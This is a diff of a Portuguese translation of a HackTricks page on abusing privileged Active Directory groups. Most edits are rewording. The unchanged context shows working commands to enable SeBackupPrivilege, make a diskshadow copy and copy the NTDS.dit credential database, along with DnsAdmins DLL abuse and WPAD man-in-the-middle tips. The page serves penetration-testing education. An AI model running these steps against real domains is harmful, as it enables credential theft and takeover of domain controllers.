@@ -6,11 +6,11 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
@@ -74,7 +74,7 @@ Este comando revela que `Server Operators` têm acesso total, permitindo a manip
 
 ## Backup Operators
 
-A filiação no grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem a travessia de pastas, listagem e cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para esse processo.
+A adesão ao grupo `Backup Operators` fornece acesso ao sistema de arquivos `DC01` devido aos privilégios `SeBackup` e `SeRestore`. Esses privilégios permitem a travessia de pastas, listagem e capacidades de cópia de arquivos, mesmo sem permissões explícitas, usando a flag `FILE_FLAG_BACKUP_SEMANTICS`. É necessário utilizar scripts específicos para este processo.
 
 Para listar os membros do grupo, execute:
 ```powershell
@@ -89,7 +89,7 @@ Para aproveitar esses privilégios localmente, os seguintes passos são empregad
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-2. Ative e verifique `SeBackupPrivilege`:
+2. Habilitar e verificar `SeBackupPrivilege`:
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
@@ -105,7 +105,7 @@ O acesso direto ao sistema de arquivos do Controlador de Domínio permite o roub
 
 #### Using diskshadow.exe
 
-1. Crie uma cópia sombra da unidade `C`:
+1. Crie uma cópia sombra do drive `C`:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -118,7 +118,7 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. Copie `NTDS.dit` da cópia sombra:
+2. Copie `NTDS.dit` da cópia de sombra:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
@@ -186,7 +186,7 @@ sc.exe \\dc01 start dns
 Para mais detalhes sobre este vetor de ataque, consulte ired.team.
 
 #### Mimilib.dll
-Também é viável usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou shells reversos. [Ver este post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para mais informações.
+Também é viável usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou shells reversos. [Verifique este post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para mais informações.
 
 ### Registro WPAD para MitM
 DnsAdmins podem manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) criando um registro WPAD após desativar a lista de bloqueio de consultas global. Ferramentas como Responder ou Inveigh podem ser usadas para spoofing e captura de tráfego de rede.
@@ -245,7 +245,7 @@ Membros podem acessar PCs através do **Windows Remote Management (WinRM)**. A e
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Para técnicas de exploração relacionadas ao **WinRM**, documentação específica deve ser consultada.
+Para técnicas de exploração relacionadas ao **WinRM**, deve-se consultar a documentação específica.
 
 #### Operadores de Servidor
 Este grupo tem permissões para realizar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração da hora do sistema e desligamento do sistema. Para enumerar os membros, o comando fornecido é:
@@ -271,8 +271,8 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas **ferramentas** da comunidade **mais avançadas** do mundo.\
-Obtenha Acesso Hoje:
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** da comunidade **mais avançadas** do mundo.\
+Acesse hoje:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
@@ -286,7 +286,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 {% endhint %}
